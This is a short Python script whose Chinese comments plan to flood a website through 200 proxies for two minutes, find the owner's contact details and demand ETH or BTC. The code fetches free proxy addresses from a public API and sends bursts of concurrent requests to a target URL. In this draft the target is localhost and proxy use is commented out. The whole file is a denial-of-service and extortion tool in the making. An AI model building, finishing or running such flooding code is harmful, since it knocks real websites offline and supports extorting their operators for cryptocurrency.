# -*- coding: utf-8 -*-
# Author: kaizhang01

import random
import requests
import json
import grequests

"""
1、200个代理，循环发送请求2分钟
2、获取站长联系方式
3、ETH or BTC.
"""
params = [{
    'url': 'http://localhost:9999/',
    'status': True,
    'email': 'z_k_001@126.com',
    'desc': '本机测试',
}]

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69",
    "Content-type": "text/html; charset=utf-8"
}


def get_proxies():
    proxy_list = []
    res = requests.get("https://ip.jiangxianli.com/api/proxy_ips")
    cont = json.loads(res.content)
    for x in cont['data']['data']:
        proxy_list.append("http://" + x['ip'] + ":" + x['port'])
    return proxy_list


def main():
    print('开始空投...')
    proxies = get_proxies()
    reqs = []
    if proxies:
        for x in range(0, 100):
            proxy = random.choice(proxies)
            #res = requests.get(params[0]['url'], headers=headers)  # , proxies={'http': proxy})
            reqs.append(grequests.get(params[0]['url'], headers=headers))
    grequests.map(reqs)
    print('结束空投...')


if __name__ == '__main__':
    main()
